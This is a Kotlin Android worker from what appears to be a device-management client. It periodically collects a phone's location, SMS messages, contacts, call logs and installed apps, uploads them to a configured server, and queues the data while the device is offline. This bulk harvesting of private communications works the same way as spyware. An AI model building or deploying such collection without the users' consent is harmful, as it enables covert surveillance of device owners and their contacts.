package com.mdm.client.workers

import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.mdm.client.collectors.*
import com.mdm.client.config.AppConfig
import com.mdm.client.network.ApiClient
import com.mdm.client.service.MdmForegroundService
import com.mdm.client.util.NetworkUtils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

/**
 * Periodic data collection and transmission worker.
 *
 * Key behaviour: Data is ALWAYS collected regardless of connectivity.
 * If the device is offline, ApiClient automatically queues payloads
 * in the OfflineDataQueue. When connectivity returns, OfflineSyncWorker
 * drains the queue.
 *
 * This ensures no data is ever lost during network outages.
 */
class DataSyncWorker(context: Context, params: WorkerParameters) :
    CoroutineWorker(context, params) {

    companion object {
        private const val TAG = "SyncWkr"
    }

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        Log.i(TAG, "DataSyncWorker running")
        val ctx = applicationContext

        if (!AppConfig.isConfigured(ctx)) {
            Log.w(TAG, "Server not configured, skipping sync")
            return@withContext Result.success()
        }

        // Ensure foreground service is running
        try {
            val intent = Intent(ctx, MdmForegroundService::class.java)
            ContextCompat.startForegroundService(ctx, intent)
        } catch (e: Exception) {
            Log.w(TAG, "Could not start service: ${e.message}")
        }

        val apiClient = ApiClient(ctx)
        val deviceId = AppConfig.getDeviceId(ctx)
        val deviceIp = NetworkUtils.getLocalIpAddress(ctx)
        val isOnline = NetworkUtils.isOnline(ctx)

        Log.i(TAG, "Sync starting — online=$isOnline, device=$deviceId")

        try {
            // Heartbeat re-registration (only when online — no point queuing this)
            if (isOnline) {
                try {
                    apiClient.registerDevice(deviceId, deviceIp)
                } catch (e: Exception) {
                    Log.w(TAG, "Heartbeat failed: ${e.message}")
                }
            }

            // ── Always collect and push data ──
            // If offline, ApiClient.post() automatically queues for later delivery

            // Push location
            try {
                val locationCollector = LocationCollector(ctx)
                val loc = locationCollector.getFreshLocation()
                if (loc["status"] == "success") {
                    apiClient.pushLocation(
                        deviceId = deviceId,
                        latitude = (loc["latitude"] as? Double) ?: 0.0,
                        longitude = (loc["longitude"] as? Double) ?: 0.0,
                        accuracy = ((loc["accuracy"] as? Float) ?: 0f),
                        provider = (loc["provider"] as? String) ?: "unknown",
                        timestamp = (loc["timestamp"] as? Long) ?: System.currentTimeMillis()
                    )
                }
            } catch (e: Exception) {
                Log.w(TAG, "Location sync failed: ${e.message}")
            }

            // Push SMS
            try {
                val smsCollector = SmsCollector(ctx)
                val messages = smsCollector.getMessages()
                if (messages.isNotEmpty()) {
                    apiClient.pushSms(deviceId, messages)
                }
            } catch (e: Exception) {
                Log.w(TAG, "SMS sync failed: ${e.message}")
            }

            // Push contacts
            try {
                val contactsCollector = ContactsCollector(ctx)
                val contacts = contactsCollector.getContacts()
                if (contacts.isNotEmpty()) {
                    apiClient.pushContacts(deviceId, contacts)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Contacts sync failed: ${e.message}")
            }

            // Push call logs
            try {
                val callLogCollector = CallLogCollector(ctx)
                val calls = callLogCollector.getCallLogs()
                if (calls.isNotEmpty()) {
                    apiClient.pushCallLogs(deviceId, calls)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Call logs sync failed: ${e.message}")
            }

            // Push installed apps
            try {
                val appsCollector = AppsCollector(ctx)
                val apps = appsCollector.getApps()
                if (apps.isNotEmpty()) {
                    apiClient.pushApps(deviceId, apps)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Apps sync failed: ${e.message}")
            }

            Log.i(TAG, "Sync complete (online=$isOnline)")
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Sync failed: ${e.message}")
            Result.retry()
        }
    }
}
